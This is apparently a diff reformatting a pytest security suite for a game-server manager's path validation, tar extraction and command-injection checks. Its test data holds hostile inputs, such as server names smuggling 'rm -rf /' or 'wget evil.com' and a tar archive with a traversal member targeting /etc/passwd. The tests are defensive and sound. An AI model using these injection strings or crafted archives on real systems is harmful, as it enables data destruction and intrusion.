@@ -21,7 +21,11 @@ from app.core.security import (
 )
 from app.servers.models import ServerType
 from app.servers.schemas import ServerCreateRequest
-from app.servers.service import ServerFileSystemService, ServerValidationService, ServerSecurityValidator
+from app.servers.service import (
+    ServerFileSystemService,
+    ServerValidationService,
+    ServerSecurityValidator,
+)
 from app.services.backup_service import BackupFileService
 
 
@@ -39,7 +43,7 @@ class TestPathValidator:
             "My Server",  # Spaces are now allowed
             "Server with spaces",
         ]
-        
+
         for name in valid_names:
             result = PathValidator.validate_safe_name(name)
             assert result == name
@@ -49,7 +53,7 @@ class TestPathValidator:
         invalid_names = [
             "../../../etc/passwd",
             "server/with/slashes",
-            "server\\with\\backslashes", 
+            "server\\with\\backslashes",
             "server@domain",
             "server#hash",
             "server$dollar",
@@ -69,7 +73,7 @@ class TestPathValidator:
             "server+plus",
             "server=equal",
         ]
-        
+
         for name in invalid_names:
             with pytest.raises(SecurityError, match="invalid characters"):
                 PathValidator.validate_safe_name(name)
@@ -84,7 +88,7 @@ class TestPathValidator:
             "..server",
             "server..",
         ]
-        
+
         for name in traversal_names:
             with pytest.raises(SecurityError):
                 PathValidator.validate_safe_name(name)
@@ -92,11 +96,20 @@ class TestPathValidator:
     def test_validate_safe_name_reserved_names(self):
         """Test that reserved names are rejected."""
         reserved_names = [
-            "CON", "PRN", "AUX", "NUL",
-            "COM1", "COM2", "LPT1", "LPT2",
-            "con", "prn", "aux", "nul",  # Test case insensitive
+            "CON",
+            "PRN",
+            "AUX",
+            "NUL",
+            "COM1",
+            "COM2",
+            "LPT1",
+            "LPT2",
+            "con",
+            "prn",
+            "aux",
+            "nul",  # Test case insensitive
         ]
-        
+
         for name in reserved_names:
             with pytest.raises(SecurityError, match="reserved name"):
                 PathValidator.validate_safe_name(name)
@@ -111,7 +124,7 @@ class TestPathValidator:
         """Test that empty or None names are rejected."""
         with pytest.raises(SecurityError, match="non-empty string"):
             PathValidator.validate_safe_name("")
-        
+
         with pytest.raises(SecurityError, match="non-empty string"):
             PathValidator.validate_safe_name(None)
 
@@ -120,11 +133,11 @@ class TestPathValidator:
         with tempfile.TemporaryDirectory() as temp_dir:
             base_dir = Path(temp_dir)
             safe_path = base_dir / "subdir" / "file.txt"
-            
+
             # Create the path to test
             safe_path.parent.mkdir(parents=True, exist_ok=True)
             safe_path.touch()
-            
+
             result = PathValidator.validate_safe_path(safe_path, base_dir)
             assert result.is_absolute()
             assert str(result).startswith(str(base_dir.resolve()))
@@ -134,10 +147,10 @@ class TestPathValidator:
         with tempfile.TemporaryDirectory() as temp_dir:
             base_dir = Path(temp_dir) / "servers"
             base_dir.mkdir()
-            
+
             # Try to traverse outside base directory
             malicious_path = base_dir / ".." / ".." / "etc" / "passwd"
-            
+
             with pytest.raises(SecurityError, match="Path traversal attempt"):
                 PathValidator.validate_safe_path(malicious_path, base_dir)
 
@@ -145,18 +158,22 @@ class TestPathValidator:
         """Test safe server directory creation."""
         with tempfile.TemporaryDirectory() as temp_dir:
             base_dir = Path(temp_dir)
-            
+
             # Test valid server name
-            server_dir = PathValidator.create_safe_server_directory("test-server", base_dir)
+            server_dir = PathValidator.create_safe_server_directory(
+                "test-server", base_dir
+            )
             assert server_dir == base_dir / "test-server"
 
     def test_create_safe_server_directory_with_sanitization(self):
         """Test that server names are sanitized for directory creation."""
         with tempfile.TemporaryDirectory() as temp_dir:
             base_dir = Path(temp_dir)
-            
+
             # Test that problematic names are sanitized
-            server_dir = PathValidator.create_safe_server_directory("My Server!", base_dir)
+            server_dir = PathValidator.create_safe_server_directory(
+                "My Server!", base_dir
+            )
             assert server_dir.name == "My_Server"
             assert str(server_dir).startswith(str(base_dir))
 
@@ -174,10 +191,12 @@ class TestPathValidator:
             ("Server!@#$%^&*()", "Server"),  # Trailing underscores are stripped
             ("Server!Middle@Characters", "Server_Middle_Characters"),
         ]
-        
+
         for input_name, expected in test_cases:
             result = PathValidator.sanitize_directory_name(input_name)
-            assert result == expected, f"Input: {input_name}, Expected: {expected}, Got: {result}"
+            assert result == expected, (
+                f"Input: {input_name}, Expected: {expected}, Got: {result}"
+            )
 
 
 class TestTarExtractor:
@@ -186,29 +205,29 @@ class TestTarExtractor:
     def create_malicious_tar(self, temp_dir: Path) -> Path:
         """Create a tar file with malicious paths for testing."""
         tar_path = temp_dir / "malicious.tar.gz"
-        
+
         with tarfile.open(tar_path, "w:gz") as tar:
             # Add a safe file
             safe_info = tarfile.TarInfo("safe_file.txt")
             safe_info.size = 5
             tar.addfile(safe_info, io.BytesIO(b"safe\n"))
-            
+
             # Add a malicious file with path traversal
             malicious_info = tarfile.TarInfo("../../../etc/passwd")
             malicious_info.size = 7
             tar.addfile(malicious_info, io.BytesIO(b"hacked\n"))
-        
+
         return tar_path
 
     def test_validate_tar_member_safe_file(self):
         """Test that safe tar members pass validation."""
         with tempfile.TemporaryDirectory() as temp_dir:
             target_dir = Path(temp_dir)
-            
+
             # Create a safe tar member
             member = tarfile.TarInfo("safe_file.txt")
             member.size = 5
-            
+
             # Should not raise an exception
             TarExtractor.validate_tar_member(member, target_dir)
 
@@ -216,7 +235,7 @@ class TestTarExtractor:
         """Test that tar members with path traversal are rejected."""
         with tempfile.TemporaryDirectory() as temp_dir:
             target_dir = Path(temp_dir)
-            
+
             # Test various path traversal patterns
             malicious_names = [
                 "../../../etc/passwd",
@@ -224,11 +243,11 @@ class TestTarExtractor:
                 "..\\..\\..\\windows\\system32",
                 "normal/../../../etc/hosts",
             ]
-            
+
             for name in malicious_names:
                 member = tarfile.TarInfo(name)
                 member.size = 5
-                
+
                 with pytest.raises(SecurityError):
                     TarExtractor.validate_tar_member(member, target_dir)
 
@@ -236,12 +255,12 @@ class TestTarExtractor:
         """Test that symbolic links are rejected."""
         with tempfile.TemporaryDirectory() as temp_dir:
             target_dir = Path(temp_dir)
-            
+
             # Create a symbolic link tar member
             member = tarfile.TarInfo("symlink")
             member.type = tarfile.SYMTYPE
             member.linkname = "/etc/passwd"
-            
+
             with pytest.raises(SecurityError, match="symbolic"):
                 TarExtractor.validate_tar_member(member, target_dir)
 
@@ -249,11 +268,11 @@ class TestTarExtractor:
         """Test that device files are rejected."""
         with tempfile.TemporaryDirectory() as temp_dir:
             target_dir = Path(temp_dir)
-            
+
             # Create a device file tar member
             member = tarfile.TarInfo("device")
             member.type = tarfile.CHRTYPE
-            
+
             with pytest.raises(SecurityError, match="device file"):
                 TarExtractor.validate_tar_member(member, target_dir)
 
@@ -263,10 +282,10 @@ class TestTarExtractor:
             temp_path = Path(temp_dir)
             target_dir = temp_path / "extract"
             target_dir.mkdir()
-            
+
             # Create malicious tar
             malicious_tar = self.create_malicious_tar(temp_path)
-            
+
             # Should raise SecurityError due to path traversal
             with pytest.raises(SecurityError):
                 TarExtractor.safe_extract_tar(malicious_tar, target_dir)
@@ -277,17 +296,17 @@ class TestTarExtractor:
             temp_path = Path(temp_dir)
             target_dir = temp_path / "extract"
             target_dir.mkdir()
-            
+
             # Create safe tar
             safe_tar = temp_path / "safe.tar.gz"
             with tarfile.open(safe_tar, "w:gz") as tar:
                 safe_info = tarfile.TarInfo("safe_file.txt")
                 safe_info.size = 12
                 tar.addfile(safe_info, io.BytesIO(b"safe content"))
-            
+
             # Should extract without issues
             TarExtractor.safe_extract_tar(safe_tar, target_dir)
-            
+
             # Verify file was extracted
             extracted_file = target_dir / "safe_file.txt"
             assert extracted_file.exists()
@@ -297,14 +316,14 @@ class TestTarExtractor:
         """Test that oversized archives are rejected."""
         with tempfile.TemporaryDirectory() as temp_dir:
             temp_path = Path(temp_dir)
-            
+
             # Create a mock large archive by creating a file and checking if validation would catch it
             large_archive = temp_path / "large.tar.gz"
-            
+
             # Create a file larger than the limit (simulate by patching the size check)
-            with patch.object(Path, 'stat') as mock_stat:
+            with patch.object(Path, "stat") as mock_stat:
                 mock_stat.return_value.st_size = TarExtractor.MAX_ARCHIVE_SIZE + 1
-                
+
                 with pytest.raises(SecurityError, match="Archive too large"):
                     TarExtractor.validate_archive_safety(large_archive)
 
@@ -313,17 +332,17 @@ class TestTarExtractor:
         with tempfile.TemporaryDirectory() as temp_dir:
             temp_path = Path(temp_dir)
             many_members_tar = temp_path / "many_members.tar.gz"
-            
+
             # Create archive with many members (use a smaller number for testing)
             test_limit = 5  # Use smaller limit for testing
-            with patch.object(TarExtractor, 'MAX_MEMBER_COUNT', test_limit):
+            with patch.object(TarExtractor, "MAX_MEMBER_COUNT", test_limit):
                 with tarfile.open(many_members_tar, "w:gz") as tar:
                     # Add more members than the limit
                     for i in range(test_limit + 1):
                         member = tarfile.TarInfo(f"file_{i}.txt")
                         member.size = 5
                         tar.addfile(member, io.BytesIO(b"test\n"))
-                
+
                 with pytest.raises(SecurityError, match="Too many files"):
                     TarExtractor.validate_archive_safety(many_members_tar)
 
@@ -332,15 +351,15 @@ class TestTarExtractor:
         with tempfile.TemporaryDirectory() as temp_dir:
             temp_path = Path(temp_dir)
             large_member_tar = temp_path / "large_member.tar.gz"
-            
+
             # Create archive with a large member
             test_limit = 1000  # Use smaller limit for testing
-            with patch.object(TarExtractor, 'MAX_MEMBER_SIZE', test_limit):
+            with patch.object(TarExtractor, "MAX_MEMBER_SIZE", test_limit):
                 with tarfile.open(large_member_tar, "w:gz") as tar:
                     member = tarfile.TarInfo("large_file.txt")
                     member.size = test_limit + 1
                     tar.addfile(member, io.BytesIO(b"x" * (test_limit + 1)))
-                
+
                 with pytest.raises(SecurityError, match="File too large"):
                     TarExtractor.validate_archive_safety(large_member_tar)
 
@@ -349,17 +368,17 @@ class TestTarExtractor:
         with tempfile.TemporaryDirectory() as temp_dir:
             temp_path = Path(temp_dir)
             large_total_tar = temp_path / "large_total.tar.gz"
-            
+
             # Create archive where total extracted size exceeds limit
             test_limit = 2000  # Use smaller limit for testing
-            with patch.object(TarExtractor, 'MAX_EXTRACTED_SIZE', test_limit):
+            with patch.object(TarExtractor, "MAX_EXTRACTED_SIZE", test_limit):
                 with tarfile.open(large_total_tar, "w:gz") as tar:
                     # Add multiple files that together exceed the limit
                     for i in range(3):
                         member = tarfile.TarInfo(f"file_{i}.txt")
                         member.size = 800  # 3 * 800 = 2400 > 2000
                         tar.addfile(member, io.BytesIO(b"x" * 800))
-                
+
                 with pytest.raises(SecurityError, match="Total extracted size too large"):
                     TarExtractor.validate_archive_safety(large_total_tar)
 
@@ -373,12 +392,12 @@ class TestFileOperationValidator:
             base_dir = Path(temp_dir)
             server_dir = base_dir / "test-server"
             server_dir.mkdir()
-            
+
             # Test valid file path within server
             result = FileOperationValidator.validate_server_file_path(
                 "test-server", "config/server.properties", base_dir
             )
-            
+
             expected = server_dir / "config" / "server.properties"
             assert result == expected.resolve()
 
@@ -386,7 +405,7 @@ class TestFileOperationValidator:
         """Test that path traversal in file paths is blocked."""
         with tempfile.TemporaryDirectory() as temp_dir:
             base_dir = Path(temp_dir)
-            
+
             # Test path traversal in file path
             with pytest.raises(SecurityError):
                 FileOperationValidator.validate_server_file_path(
@@ -397,7 +416,7 @@ class TestFileOperationValidator:
         """Test that invalid server names are rejected."""
         with tempfile.TemporaryDirectory() as temp_dir:
             base_dir = Path(temp_dir)
-            
+
             # Test invalid server name
             with pytest.raises(SecurityError):
                 FileOperationValidator.validate_server_file_path(
@@ -411,14 +430,14 @@ class TestServerServiceSecurity:
     def test_server_validation_service_rejects_malicious_names(self):
         """Test that server validation rejects malicious names."""
         validation_service = ServerValidationService()
-        
+
         malicious_names = [
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32",
             "../../app/core/database.py",
             "normal/../../../etc/hosts",
         ]
-        
+
         for name in malicious_names:
             with pytest.raises(InvalidRequestException):
                 validation_service.validate_server_directory(name)
@@ -427,13 +446,13 @@ class TestServerServiceSecurity:
     async def test_filesystem_service_rejects_malicious_names(self):
         """Test that filesystem service rejects malicious server names."""
         filesystem_service = ServerFileSystemService()
-        
+
         malicious_names = [
             "../../../tmp/malicious",
             "..\\..\\..\\windows\\temp",
             "normal/../../../tmp/hack",
         ]
-        
+
         for name in malicious_names:
             with pytest.raises(InvalidRequestException):
                 await filesystem_service.create_server_directory(name)
@@ -445,10 +464,10 @@ class TestServerServiceSecurity:
             # Create a custom filesystem service with temp directory
             filesystem_service = ServerFileSystemService()
             filesystem_service.base_directory = Path(temp_dir)
-            
+
             # Test safe names
             safe_names = ["test-server", "my_server", "server123"]
-            
+
             for name in safe_names:
                 server_dir = await filesystem_service.create_server_directory(name)
                 assert server_dir.exists()
@@ -467,9 +486,9 @@ class TestBackupServiceSecurity:
             temp_path = Path(temp_dir)
             backups_dir = temp_path / "backups"
             backups_dir.mkdir()
-            
+
             backup_service = BackupFileService(backups_dir)
-            
+
             # Create malicious backup file
             malicious_backup = temp_path / "malicious_backup.tar.gz"
             with tarfile.open(malicious_backup, "w:gz") as tar:
@@ -477,14 +496,14 @@ class TestBackupServiceSecurity:
                 malicious_info = tarfile.TarInfo("../../../etc/passwd")
                 malicious_info.size = 7
                 tar.addfile(malicious_info, io.BytesIO(b"hacked\n"))
-            
+
             # Create mock backup and server objects
             mock_backup = Mock()
             mock_backup.file_path = str(malicious_backup)
-            
+
             mock_server = Mock()
             mock_server.directory_path = str(temp_path / "target")
-            
+
             # Should raise FileOperationException (which wraps SecurityError) when extracting malicious backup
             with pytest.raises(FileOperationException):
                 backup_service._extract_backup_to_directory(
@@ -497,15 +516,15 @@ class TestBackupServiceSecurity:
         from app.services.backup_service import BackupService
         from app.core.exceptions import FileOperationException
         from unittest.mock import AsyncMock, Mock
-        
+
         with tempfile.TemporaryDirectory() as temp_dir:
             temp_path = Path(temp_dir)
-            
+
             # Create BackupService and set custom backup directory for testing
             backup_service = BackupService()
             backup_service.backups_directory = temp_path / "backups"
             backup_service.backups_directory.mkdir()
-            
+
             # Create malicious backup file content
             malicious_content = io.BytesIO()
             with tarfile.open(fileobj=malicious_content, mode="w:gz") as tar:
@@ -513,41 +532,48 @@ class TestBackupServiceSecurity:
                 malicious_info = tarfile.TarInfo("../../../etc/passwd")
                 malicious_info.size = 7
                 tar.addfile(malicious_info, io.BytesIO(b"hacked\n"))
-            
+
             malicious_bytes = malicious_content.getvalue()
-            
+
             # Create mock upload file
             mock_upload_file = AsyncMock()
             mock_upload_file.filename = "malicious.tar.gz"
             mock_upload_file.headers = {"content-length": str(len(malicious_bytes))}
-            
+
             # Mock the chunked reading behavior for streaming
             chunk_size = 8192
-            chunks = [malicious_bytes[i:i+chunk_size] for i in range(0, len(malicious_bytes), chunk_size)]
+            chunks = [
+                malicious_bytes[i : i + chunk_size]
+                for i in range(0, len(malicious_bytes), chunk_size)
+            ]
             chunks.append(b"")  # End of file marker
             mock_upload_file.read = AsyncMock(side_effect=chunks)
-            
+
             # Create mock database session
             mock_db = Mock()
-            
+
             # Mock the validation service
-            with patch('app.services.backup_service.BackupValidationService.validate_server_for_backup') as mock_validate:
+            with patch(
+                "app.services.backup_service.BackupValidationService.validate_server_for_backup"
+            ) as mock_validate:
                 mock_server = Mock()
                 mock_server.id = 1
                 mock_validate.return_value = mock_server
-                
+
                 # Should raise FileOperationException due to security validation failure
                 try:
                     result = await backup_service.upload_backup(
-                        server_id=1,
-                        file=mock_upload_file,
-                        db=mock_db
+                        server_id=1, file=mock_upload_file, db=mock_db
                     )
                     # If we get here, the test failed - security validation should have caught the malicious file
-                    pytest.fail(f"Expected security validation to fail, but upload succeeded: {result}")
+                    pytest.fail(
+                        f"Expected security validation to fail, but upload succeeded: {result}"
+                    )
                 except FileOperationException as e:
                     # This is what we expect - verify it's a security validation failure
-                    assert "Security validation failed" in str(e), f"Expected security validation error, got: {e}"
+                    assert "Security validation failed" in str(e), (
+                        f"Expected security validation error, got: {e}"
+                    )
                 except Exception as e:
                     # Log any other exceptions for debugging
                     pytest.fail(f"Unexpected exception type: {type(e).__name__}: {e}")
@@ -560,15 +586,15 @@ class TestIntegrationSecurity:
         """Test end-to-end protection against path traversal in server creation."""
         # This test would require setting up a full test database and services
         # For now, we test the core validation logic
-        
+
         malicious_requests = [
             {"name": "../../../etc/passwd"},
             {"name": "..\\..\\..\\windows\\system32"},
             {"name": "normal/../../../tmp/hack"},
         ]
-        
+
         validation_service = ServerValidationService()
-        
+
         for request_data in malicious_requests:
             with pytest.raises(InvalidRequestException):
                 validation_service.validate_server_directory(request_data["name"])
@@ -577,14 +603,14 @@ class TestIntegrationSecurity:
         """Test that file operations validate paths correctly."""
         with tempfile.TemporaryDirectory() as temp_dir:
             base_dir = Path(temp_dir)
-            
+
             # Test that malicious file paths are rejected
             malicious_paths = [
                 "../../../etc/passwd",
                 "..\\..\\..\\windows\\system32\\config",
                 "normal/../../../tmp/hack",
             ]
-            
+
             for path in malicious_paths:
                 with pytest.raises(SecurityError):
                     FileOperationValidator.validate_server_file_path(
@@ -598,7 +624,7 @@ class TestCommandInjectionSecurity:
     def test_memory_value_validation_valid_values(self):
         """Test that valid memory values pass validation."""
         valid_values = [512, 1024, 2048, 4096, 8192, 16384]
-        
+
         for value in valid_values:
             # Should not raise exception
             assert ServerSecurityValidator.validate_memory_value(value) is True
@@ -606,16 +632,16 @@ class TestCommandInjectionSecurity:
     def test_memory_value_validation_invalid_values(self):
         """Test that invalid memory values are rejected."""
         from app.core.exceptions import InvalidRequestException
-        
+
         invalid_values = [
             -1,  # Negative
-            0,   # Zero
+            0,  # Zero
             33000,  # Too large
             "512",  # String instead of int
             512.5,  # Float
-            None,   # None
+            None,  # None
         ]
-        
+
         for value in invalid_values:
             with pytest.raises(InvalidRequestException):
                 ServerSecurityValidator.validate_memory_value(value)
@@ -627,9 +653,9 @@ class TestCommandInjectionSecurity:
             "minecraft-server.jar",
             "paper-1.20.1.jar",
             "spigot_1.19.4.jar",
-            "fabric-server-mc.1.20.2.jar"
+            "fabric-server-mc.1.20.2.jar",
         ]
-        
+
         for name in valid_names:
             # Should not raise exception
             assert ServerSecurityValidator.validate_jar_filename(name) is True
@@ -637,7 +663,7 @@ class TestCommandInjectionSecurity:
     def test_jar_filename_validation_invalid_names(self):
         """Test that invalid JAR filenames are rejected."""
         from app.core.exceptions import InvalidRequestException
-        
+
         invalid_names = [
             "",  # Empty
             "server.txt",  # Wrong extension
@@ -651,7 +677,7 @@ class TestCommandInjectionSecurity:
             "`wget evil.com`.jar",  # Command injection
             "a" * 300 + ".jar",  # Too long
         ]
-        
+
         for name in invalid_names:
             with pytest.raises(InvalidRequestException):
                 ServerSecurityValidator.validate_jar_filename(name)
@@ -664,9 +690,9 @@ class TestCommandInjectionSecurity:
             "Server 123",
             "My-Server_With.Spaces",
             "simple",
-            "Test Server Name"
+            "Test Server Name",
         ]
-        
+
         for name in valid_names:
             # Should not raise exception
             assert ServerSecurityValidator.validate_server_name(name) is True
@@ -674,7 +700,7 @@ class TestCommandInjectionSecurity:
     def test_server_name_validation_invalid_names(self):
         """Test that invalid server names are rejected."""
         from app.core.exceptions import InvalidRequestException
-        
+
         invalid_names = [
             "",  # Empty
             "   ",  # Only spaces
@@ -704,7 +730,7 @@ class TestCommandInjectionSecurity:
             "server=equals",  # Invalid characters
             "a" * 150,  # Too long
         ]
-        
+
         for name in invalid_names:
             with pytest.raises(InvalidRequestException):
                 ServerSecurityValidator.validate_server_name(name)
@@ -715,9 +741,9 @@ class TestCommandInjectionSecurity:
             "/usr/bin/java",
             "/opt/java/bin/java",
             "/usr/lib/jvm/java-17-openjdk/bin/java",
-            "/home/user/java/bin/java"
+            "/home/user/java/bin/java",
         ]
-        
+
         for path in valid_paths:
             # Should not raise exception
             assert ServerSecurityValidator.validate_java_path(path) is True
@@ -725,7 +751,7 @@ class TestCommandInjectionSecurity:
     def test_java_path_validation_invalid_paths(self):
         """Test that invalid Java paths are rejected."""
         from app.core.exceptions import InvalidRequestException
-        
+
         invalid_paths = [
             "",  # Empty
             "java",  # Relative path
@@ -740,7 +766,7 @@ class TestCommandInjectionSecurity:
             "/usr/bin/java$variable",  # Invalid characters
             "a" * 600,  # Too long
         ]
-        
+
         for path in invalid_paths:
             with pytest.raises(InvalidRequestException):
                 ServerSecurityValidator.validate_java_path(path)
@@ -748,7 +774,7 @@ class TestCommandInjectionSecurity:
     def test_shell_sanitization(self):
         """Test shell sanitization function."""
         import shlex
-        
+
         test_cases = [
             "simple",
             "with spaces",
@@ -759,11 +785,13 @@ class TestCommandInjectionSecurity:
             "with|pipe",
             "with`backtick`",
         ]
-        
+
         for input_val in test_cases:
             result = ServerSecurityValidator.sanitize_for_shell(input_val)
             expected = shlex.quote(input_val)
-            assert result == expected, f"Input: {input_val}, Expected: {expected}, Got: {result}"
+            assert result == expected, (
+                f"Input: {input_val}, Expected: {expected}, Got: {result}"
+            )
 
     @pytest.mark.asyncio
     async def test_startup_script_generation_command_injection_protection(self):
@@ -772,27 +800,29 @@ class TestCommandInjectionSecurity:
         from app.servers.models import Server
         from unittest.mock import Mock
         import tempfile
-        
+
         with tempfile.TemporaryDirectory() as temp_dir:
             server_dir = Path(temp_dir)
-            
+
             # Create mock server with malicious values
             malicious_server = Mock(spec=Server)
             malicious_server.id = 1
             malicious_server.max_memory = 1024  # Valid value
-            
+
             filesystem_service = ServerFileSystemService()
-            
+
             # This should not raise an exception and should create a secure script
-            await filesystem_service._generate_startup_script(malicious_server, server_dir)
-            
+            await filesystem_service._generate_startup_script(
+                malicious_server, server_dir
+            )
+
             # Verify script was created
             script_file = server_dir / "start.sh"
             assert script_file.exists()
-            
+
             # Read script content and verify it's safe
             script_content = script_file.read_text()
-            
+
             # Verify script uses proper variable quoting
             assert "SERVER_DIR=" in script_content
             assert "MAX_MEMORY=" in script_content
@@ -803,7 +833,7 @@ class TestCommandInjectionSecurity:
     def test_command_injection_integration_server_creation(self):
         """Test command injection protection in server creation flow."""
         from app.core.exceptions import InvalidRequestException
-        
+
         # Test malicious server names that should be rejected
         malicious_names = [
             "server; rm -rf /",
@@ -812,40 +842,40 @@ class TestCommandInjectionSecurity:
             "server`wget evil.com`",
             "$(rm -rf /tmp)",
         ]
-        
+
         # All malicious names should fail server name validation
         for name in malicious_names:
             with pytest.raises(InvalidRequestException):
                 ServerSecurityValidator.validate_server_name(name)
-        
+
         # Test malicious memory values should be rejected
         malicious_memory_values = [
             -1,  # Negative
-            0,   # Zero
+            0,  # Zero
             50000,  # Too large
         ]
-        
+
         for memory in malicious_memory_values:
             with pytest.raises(InvalidRequestException):
                 ServerSecurityValidator.validate_memory_value(memory)
-                
+
         # This demonstrates defense in depth - multiple validation layers
 
     def test_security_validator_edge_cases(self):
         """Test edge cases in security validation."""
         from app.core.exceptions import InvalidRequestException
-        
+
         # Test None values
         with pytest.raises(InvalidRequestException):
             ServerSecurityValidator.validate_server_name(None)
-        
+
         # Test boundary values for memory
         ServerSecurityValidator.validate_memory_value(1)  # Minimum allowed
         ServerSecurityValidator.validate_memory_value(32768)  # Maximum allowed
-        
+
         with pytest.raises(InvalidRequestException):
             ServerSecurityValidator.validate_memory_value(0)  # Below minimum
-        
+
         with pytest.raises(InvalidRequestException):
             ServerSecurityValidator.validate_memory_value(32769)  # Above maximum
 
@@ -857,36 +887,36 @@ class TestCommandInjectionSecurity:
         from unittest.mock import Mock
         import tempfile
         import stat
-        
+
         with tempfile.TemporaryDirectory() as temp_dir:
             server_dir = Path(temp_dir)
-            
+
             # Create valid server mock
             server = Mock(spec=Server)
             server.id = 1
             server.max_memory = 2048
-            
+
             filesystem_service = ServerFileSystemService()
-            
+
             # Generate startup script
             await filesystem_service._generate_startup_script(server, server_dir)
-            
+
             script_file = server_dir / "start.sh"
             script_content = script_file.read_text()
-            
+
             # Verify security features
             security_checks = [
                 "set -e",  # Exit on error
                 "set -u",  # Exit on undefined variable
                 "SERVER_DIR=",  # Proper variable assignment
-                "if [ ! -d \"$SERVER_DIR\" ]",  # Directory validation
-                "if [ ! -f \"$SERVER_DIR/$JAR_FILE\" ]",  # File validation
+                'if [ ! -d "$SERVER_DIR" ]',  # Directory validation
+                'if [ ! -f "$SERVER_DIR/$JAR_FILE" ]',  # File validation
                 "exec java",  # Proper process execution
             ]
-            
+
             for check in security_checks:
                 assert check in script_content, f"Missing security feature: {check}"
-            
+
             # Verify file permissions (should be executable)
             file_stat = script_file.stat()
             assert file_stat.st_mode & stat.S_IRUSR  # Owner read
@@ -901,6 +931,6 @@ except ImportError:
     # Create mock exceptions for testing
     class InvalidRequestException(Exception):
         pass
-    
+
     class FileOperationException(Exception):
         pass
